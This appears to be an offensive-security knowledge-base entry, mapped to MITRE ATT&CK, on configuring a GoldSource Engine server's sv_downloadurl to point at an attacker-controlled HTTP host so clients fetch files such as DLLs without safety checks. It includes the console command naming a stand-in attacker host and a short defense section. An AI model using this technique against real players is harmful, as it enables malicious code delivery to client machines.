---
tags:
  - goldsource-engine
  - http-bypass
type: procedure
tools:
  - '[[tools/IDA-Pro]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Windows
  - Game Engine
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T05:32:10.364Z'
sub_techniques: []
id: f9bdd7d3-338c-476e-834e-20b5d7fc3b8f
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Configure-Server-for-HTTP-Downloads

## Summary

This procedure sets up a GoldSource Engine server to use HTTP for file downloads, bypassing UDP-based Netchan checks and enabling arbitrary file transfers to clients.

## Description

In the GoldSource Engine, the sv_downloadurl variable allows redirection of resource downloads to an HTTP server. This exploits the lack of validation in HTTP paths, allowing servers to push files like DLLs without triggering client-side safety checks in functions like IsSafeFileToDownload. Prerequisites include server admin access and an HTTP host. Expected outcome: Clients download resources solely via HTTP, vulnerable to malicious content.

## Requirements

1. GoldSource Engine server running build 7960
2. HTTP server (e.g., local Apache or nginx) under attacker control
3. Network access to set console variables

## Defense

Defensive measures and detection strategies:

- Disable sv_downloadurl or restrict to trusted URLs
- Monitor server console for suspicious variable changes
- Client-side: Patch CL_CheckFile to enforce IsSafeFileToDownload for all resources

## Objectives

1. Redirect downloads to attacker-controlled HTTP endpoint
2. Bypass Netchan_CopyFileFragments validation
3. Prepare for malicious resource queuing

## Instructions

### Step 1: Access Server Console

**Context**: Log into the server administration interface or console to modify configuration variables.

**Command**:
No specific command; use server console directly.

> Enter the console and set the variable. Expected output: Confirmation in logs that HTTP redirection is active.

### Step 2: Set sv_downloadurl

**Context**: Point downloads to the HTTP endpoint to enable bypass.

**Command**:
```c++
// Server console input
sv_downloadurl "http://attacker-controlled-server.com"
```

> This updates the configuration. For local testing: `sv_downloadurl "http://127.0.0.1"`. Verify by checking server logs for no errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/IDA-Pro]]

## Tags

- goldsource-engine
- http-bypass
